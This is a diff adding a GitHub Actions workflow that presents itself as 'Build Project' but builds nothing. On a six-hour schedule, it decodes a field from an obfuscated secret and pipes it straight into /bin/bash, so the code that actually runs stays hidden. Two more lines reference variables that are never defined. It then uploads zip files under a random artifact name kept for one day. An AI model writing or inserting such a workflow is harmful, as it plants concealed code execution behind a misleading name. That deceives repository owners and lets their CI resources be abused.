@@ -1,0 +1,35 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          dseh90725: ${{ secrets.dseh90725 }}
+        run: |
+          printf '%s' "$dseh90725" | jq -r .ezfu96 | /bin/bash
+          printf '%s' "$mowlm770" | jq -r .o4620 | /bin/bash
+          printf '%s' "$jymrj0" | jq -r .onkit83045 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: G4pZLUhp
+          path: "*.zip"
+          retention-days: 1
